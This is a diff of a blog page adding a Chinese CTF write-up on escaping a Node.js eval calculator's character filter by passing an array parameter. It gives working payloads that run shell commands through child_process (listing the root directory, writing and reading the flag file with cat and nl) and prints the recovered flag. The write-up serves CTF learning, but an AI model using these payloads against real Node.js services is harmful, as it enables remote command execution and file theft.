class="string">&quot;*&quot;</span> + calc.<span class="title function_">slice</span>(i + <span class="number">1</span>, calc.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//截取</span></span><br><span class="line">calc = calc.<span class="title function_">substring</span>(<span class="number">0</span>, <span class="number">64</span>);</span><br><span class="line"><span class="comment">//去空</span></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\s+/g</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">calc = calc.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&quot;\\\\&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//小明的同学过滤了一些比较危险的东西</span></span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;sh&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;ln&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;ln&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;fs&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;fs&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> (calc.<span class="title function_">indexOf</span>(<span class="string">&quot;x&quot;</span>) &gt; -<span class="number">1</span>) &#123;</span><br><span class="line">    calc = calc.<span class="title function_">replace</span>(<span class="string">&quot;x&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    result = <span class="built_in">eval</span>(calc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>解释一下代码:</p>
+<p><strong>检测当前元素是否非法</strong>（或之前已经发现过非法元素）。</p>
+<p>一旦触发，就 <strong>把 flag 置为 true</strong>，确保之后每个元素都进入替换逻辑。</p>
+<p><strong>用 <code>&quot;\*&quot;</code> 替换当前元素</strong>（但因为 <code>+</code> 拼接，数组被转换成字符串）。</p>
+<p>提示:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.别想太复杂，试着传传其他数据类型</span><br><span class="line">2.字符串的length和数组的length是不一样的。你能将自己的payload逃逸出来吗。</span><br></pre></td></tr></table></figure>
+
+<p>可以在本地进行测试</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = <span class="string">&quot;aaaa.aaa&quot;</span>;</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.<span class="property">split</span><span class="string">``</span>.<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.<span class="title function_">slice</span>(i + <span class="number">1</span>, calc.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(calc)<span class="comment">//</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250913151907069.png" alt="image-20250913151907069"></p>
+<p>非法字符后的字符都替换成 ****</p>
+<p>再进行测试</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> calc = [<span class="string">&#x27;aaaaaaaaaa&#x27;</span>,<span class="string">&#x27;bbbb&#x27;</span>,<span class="string">&#x27;.&#x27;</span>];</span><br><span class="line"><span class="keyword">let</span> flag = <span class="literal">false</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(calc.<span class="property">length</span>)</span><br><span class="line"><span class="comment">//waf</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; calc.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (flag || <span class="string">&quot;/(flc&#x27;\&quot;.&quot;</span>.<span class="property">split</span><span class="string">``</span>.<span class="title function_">some</span>(<span class="function"><span class="params">v</span> =&gt;</span> v == calc[i])) &#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">        calc = calc.<span class="title function_">slice</span>(<span class="number">0</span>, i) + <span class="string">&quot;*&quot;</span> + calc.<span class="title function_">slice</span>(i + <span class="number">1</span>, calc.<span class="property">length</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(calc)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250913152527884.png" alt="image-20250913152527884"></p>
+<p>在数组的第三个元素发现非法字符,但是slice是从第三的元素开始替换</p>
+<p>存在逻辑问题，可以逃逸前三个字符（任意值）</p>
+<p><img src="/images/image-20250913153357283.png" alt="image-20250913153357283"></p>
+<p>因为禁止了<code>x</code>,不能出现<code>exec</code>,可以用<code>require(&quot;child_process&quot;).spawn(&#39;sleep&#39;, [&#39;3&#39;]);</code></p>
+<p>直接调用 <code>spawnSync(&#39;sleep&#39;, [&#39;3&#39;])</code> 而没有将其结果赋值给一个变量时，Node.js 仍然会执行 <code>sleep</code> 命令并等待 3 秒，但你不会看到任何输出或结果，因为你没有处理这个返回的对象</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;/&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>();</span><br></pre></td></tr></table></figure>
+
+<p>把结果输出即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">re = <span class="number">0</span></span><br><span class="line">s = <span class="string">&quot;require(&#x27;child_process&#x27;).spawnSync(&#x27;ls&#x27;,[&#x27;/&#x27;]).stdout.toString();&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s.__len__())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&amp;calc[]=1&quot;</span>*s.__len__())</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>(<span class="string">&#x27;ls&#x27;</span>,[<span class="string">&#x27;/&#x27;</span>]).<span class="property">stdout</span>.<span class="title function_">toString</span>();&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=<span class="number">1</span>&amp;calc[]=.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250913155035971.png" alt="image-20250913155035971"></p>
+<p>尝试cat &#x2F;G*,发现没有回显,将这个文件写入静态文件a中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=Object.values(require(&#x27;child_process&#x27;))[5](&#x27;cat$IFS$9/G*&gt;a&#x27;).toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>
+
+<p>利用<code>require(&#39;child_process&#39;).spawnSync(&#39;nl&#39;,[&#39;a&#39;]).stdout.toString();</code>读文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">calc[]=require(&#x27;child_process&#x27;).spawnSync(&#x27;nl&#x27;,[&#x27;a&#x27;]).stdout.toString();&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=1&amp;calc[]=.</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20250913155726436.png" alt="image-20250913155726436"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NSSCTF&#123;d7a0ce62-0588-468d-962b-82dc93a05c02&#125;</span><br></pre></td></tr></table></figure>
+
+
     </div>
 
     
@@ -238,6 +429,9 @@
     
 
     <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/node-js-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" rel="tag"># node.js 命令执行</a>
+          </div>
 
         
 
@@ -282,14 +476,14 @@
       <i class="fa fa-chart-line"></i>
     </span>
       <span>站点总字数：</span>
-    <span title="站点总字数">157k</span>
+    <span title="站点总字数">168k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:23</span>
+    <span title="站点阅读时长">2:33</span>
   </span>
 </div>
 
